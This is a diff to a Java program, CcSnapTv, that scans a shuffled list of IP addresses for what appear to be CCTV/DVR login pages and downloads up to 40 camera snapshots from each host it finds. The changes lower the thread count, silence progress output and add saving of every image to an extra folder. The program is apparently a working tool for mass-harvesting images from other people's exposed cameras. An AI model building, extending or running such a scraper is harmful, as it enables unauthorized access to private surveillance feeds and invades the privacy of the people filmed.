@@ -69,7 +69,7 @@ public class CcSnapTv
             }
             readIps();
             Collections.shuffle(ips);
-            ExecutorService executorService = Executors.newFixedThreadPool(250);
+            ExecutorService executorService = Executors.newFixedThreadPool(15);
 
             for (final String ip : ips)
             {
@@ -95,8 +95,6 @@ public class CcSnapTv
             e.printStackTrace();
         }
     }
-
-
 
     public String getIpCountry(String ip)
     {
@@ -139,7 +137,7 @@ public class CcSnapTv
             if (page.contains("login_chk_usr_pwd()"))
             {
                 found++;
-                System.out.println(ip + " " + found + "/" + total);
+                //System.out.println(ip + " " + found + "/" + total);
                 for (int i = 0; i < 40; i++)
                 {   //Download at most 40 images - To prevent errors.
                     httpRequestInfromation = new HttpRequestInformation();
@@ -162,13 +160,20 @@ public class CcSnapTv
                     //String filename = outputDir +"/" +(found)+"_"+(ip.replace(":","_"))+"_"+i+".jpg";
                     //String filename = outputDir + "/" + "_" + (ip.replace(":", "_")) + "_" + i + ".jpg";
                     String filename = thisOutputDir+ "/" + "_" + (ip.replace(":", "_")) + "_" + i + ".jpg";
-
                     FileUtils.writeByteArrayToFile(new File(filename), httpResult.getContent());
                     if (!validImage(filename))
                     {
                         //Move it into a different directory.
                         //new File(filename).renameTo(new File(filename.replace(outputDir +"/" , "output_bad/")));
                         //Or delete it.
+                        new File(filename).delete();
+                    }
+                    thisOutputDir = outputDir+"/_everything";
+                    filename = thisOutputDir+ "/" + "_" + (ip.replace(":", "_")) + "_" + i + ".jpg";
+
+                    FileUtils.writeByteArrayToFile(new File(filename), httpResult.getContent());
+                    if (!validImage(filename))
+                    {
                         new File(filename).delete();
                     }
                 }
